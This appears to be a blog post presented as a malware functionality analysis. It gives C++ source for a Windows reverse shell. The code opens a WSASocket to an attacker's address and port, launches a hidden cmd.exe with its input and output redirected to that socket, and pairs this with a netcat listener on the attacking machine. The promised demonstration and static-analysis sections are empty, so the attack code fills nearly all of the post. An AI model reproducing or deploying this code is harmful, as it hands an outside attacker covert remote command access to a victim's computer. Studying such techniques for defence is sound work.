---
layout: post
title: Malware Functionality Analysis: Simple Reverse Shell
---

# Malware Functionality Analysis: Simple Reverse Shell

## Implementing the Reverse Shell

Let's first analyse what we require to develop this functionality.

1. A socket with which commands and communication will be routed to the server,
2. A `cmd.exe` process that acts as the shell,
3. A listening server on the attacking machine (netcat will be sufficient enough for this).

### Creating the Connection

I will keep this section brief because creating and connecting a socket is a trivial procedure and there are many tutorials out there explaining how it can be done.

```c++
SOCKET tcpConnect(std::string address, std::string port) {
    getaddrinfo(address.c_str(), port.c_str(), ...);
    
    /*
     * Create a TCP socket connection.
     *
     * It's important that we use WSASocket here instead of the normal socket 
     * function and without the WSA_FLAG_OVERLAPPED flag.
     */
    SOCKET s = WSASocket(..., SOCK_STREAM, IPPROTO_TCP, ...);
    
    connect(s, ...);
    
    return s;
}
```

Note that we require the [`WSASocket`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx) function because the (non-overlapped) socket will be required to work with I/O redirection with the shell's handles.

### Creating the Shell Process

The `cmd.exe` process acts as the shell so the application must create this as a separate process using the [`CreateProcess`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx) function specifying the executable's path and also setting the stdin/stdout/stderr handles to the socket specified in the [`STARTUPINFO structure`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx).

```c++
void createShell(void) {
    SOCKET s = tcpConnect(ADDRESS, PORT);
    
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    
    /*
     * We specify what values we want to use.
     * STARTF_USESTDHANDLES specifies that we want to use stdin/stdout/stderr.
     * STARTF_USESHOWWINDOW specifies that we want to control how the window appears.
     */
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    
    /*
     * Set stdin/stdout/stderr to the socket.
     */
    si.hStdError = si.hStdInput = si.hStdOutput = (HANDLE)s;
    
    /*
     * The process's window will not be shown.
     */
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    
    /*
     * Retrieve the path of the cmd.exe executable's path.
     * We use this so that it will systemmatically retrieve the 
     * system directory which may not always be "C:\Windows\system32".
     *
     * NOTE: Depending on your application's architecture, this
     * value will change under the hood, i.e. if your application is 
     * a 32-bit process, it will get the SYSWOW64 directory whereas 
     * the 64-bit counterpart will get the system32 directory. Make 
     * sure your application exists in its corresponding directory 
     * when doing something like this. Alternatively, you can force 
     * to not swap to SYSWOW64 by explicitly calling 
     * Wow64DisableWow64FsRedirection.
     * (https://msdn.microsoft.com/en-us/library/windows/desktop/aa365743(v=vs.85).aspx).
     */
     char szSysDirectory[MAX_PATH + 1];
     GetSystemDirectory(szSysDirectory, MAX_PATH);
     
     /*
      * Append "\cmd.exe" onto the system directory.
      */
     std::string cmdExe = szSysDirectory;
     cmdExe += "\\cmd.exe";
     
     /*
      * Create the cmd.exe process.
      * Make sure that the process inherits the handles.
      */
     CreateProcess(cmdExe.c_str(), ..., true, 0, ..., &si, &pi);
     
     /*
      * Block until the cmd.exe process has completed.
      */
     WaitForSingleObject(pi.hProcess, INFINITE);
}
```

Once the `cmd.exe` process has been created, we call [`WaitForSingleObject`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687032(v=vs.85).aspx) to block the application until the shell process has finished execution.

### Demonstration



### Static Analysis

